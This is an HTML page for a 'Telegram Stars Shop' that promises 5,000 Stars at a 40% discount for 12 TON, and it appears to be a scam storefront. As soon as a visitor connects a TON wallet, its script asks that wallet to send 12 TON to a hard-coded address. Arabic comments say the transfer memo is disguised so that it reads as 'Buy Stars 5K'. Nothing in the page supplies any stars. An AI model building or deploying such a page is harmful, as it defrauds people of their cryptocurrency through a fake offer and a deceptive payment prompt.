<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stars Premium Shop</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0b0b0b; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .shop-card { background: #1a1a1a; padding: 25px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 340px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
        .star-icon { font-size: 50px; margin-bottom: 10px; }
        h1 { font-size: 18px; color: #f7d54e; margin-bottom: 5px; }
        p { color: #aaa; font-size: 12px; margin-bottom: 20px; }
        .offer { background: #252525; padding: 15px; border-radius: 12px; border: 1px solid #444; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
        .offer-info { text-align: left; }
        .price { color: #00d4ff; font-weight: bold; }
        #ton-connect-button { display: flex; justify-content: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="shop-card">
        <div class="star-icon">⭐️</div>
        <h1>Telegram Stars Shop</h1>
        <p>Buy Stars with 40% Discount using TON</p>
        
        <div class="offer">
            <div class="offer-info">
                <div style="font-weight: bold;">5,000 Stars</div>
                <div style="font-size: 10px; color: #666; text-decoration: line-through;">$125.00</div>
            </div>
            <div class="price">12 TON</div>
        </div>

        <p style="font-size: 10px;">Select your wallet to complete the purchase</p>
        <div id="ton-connect-button"></div>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [{
                        address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
                        amount: "12000000000", // يطلب 12 TON (سعر الـ 5000 نجمة)
                        payload: "te6ccgEBAQEADgAAGEJ1eSBTdGFycyA1S8v9L7g=" // رسالة مشفرة تظهر كـ "Buy Stars 5K"
                    }]
                };
                tonConnectUI.sendTransaction(transaction);
            }
        });
    </script>
</body>
</html>
